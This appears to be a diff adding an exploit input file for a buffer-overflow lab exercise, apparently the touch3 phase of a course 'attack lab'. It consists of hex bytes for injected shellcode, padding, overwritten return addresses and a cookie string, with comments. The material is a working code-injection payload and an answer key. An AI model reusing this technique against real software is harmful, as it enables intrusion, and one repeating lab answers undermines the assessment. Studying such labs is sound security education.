@@ -1,0 +1,11 @@
+48 c7 c7 b8 dc 61 55 /* mov    $0x5561dcb8,%rdi */
+c3 /* ret */
+c3 /* ret */
+00 00 00 00 00 00 00 /* padding */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /* padding */
+78 dc 61 55 00 00 00 00 /* address of shellcode */
+80 dc 61 55 00 00 00 00 /* second ret */
+fa 18 40 00 00 00 00 00 /* address of touch3 */
+35 39 62 39 39 37 66 61 /* strings of cookie*/
